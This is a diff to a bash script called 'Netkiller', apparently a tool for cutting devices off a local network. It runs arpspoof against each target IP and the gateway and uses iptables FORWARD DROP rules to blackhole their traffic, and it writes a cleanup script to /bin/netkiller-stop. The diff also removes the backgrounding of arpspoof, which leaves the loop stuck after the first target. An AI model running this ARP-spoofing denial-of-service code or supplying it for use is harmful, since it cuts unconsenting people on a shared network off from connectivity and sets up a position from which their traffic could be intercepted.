@@ -25,24 +25,20 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
 iptables -P FORWARD DROP
 iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A FORWARD -j DROP
 echo " "
 
 # Functions for clean up
 cat > /bin/netkiller-stop << EOF
 #!/bin/bash
 
-echo -e "\nCleaning up rules..."
-sleep 2
 echo -e "\nUnblocking network devices..."
 pkill -f arpspoof
 pkill arpspoof
-ip -s -s neigh flush all >/dev/null 2>&1
-iptables -P FORWARD ACCEPT
-iptables -t mangle -F FORWARD 
-iptables -t mangle -F PREROUTING
-iptables -F FORWARD
+iptables -F FORWARD 
 sleep 2
 echo -e "\nConnection is restored..."
+echo " "
 EOF
 chmod 755 /bin/netkiller-stop
 
@@ -234,10 +230,7 @@ echo " "
 # Start ARP spoofing for each target
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
-   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-     iptables -A FORWARD -s "$TARGET" -j DROP
-     iptables -t mangle -A FORWARD -s "$TARGET" -j DROP
-     iptables -t mangle -A PREROUTING -s "$TARGET" -j DROP
+   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 )
 done
 echo " "
 echo "To stop Netkiller, run: netkiller-stop"
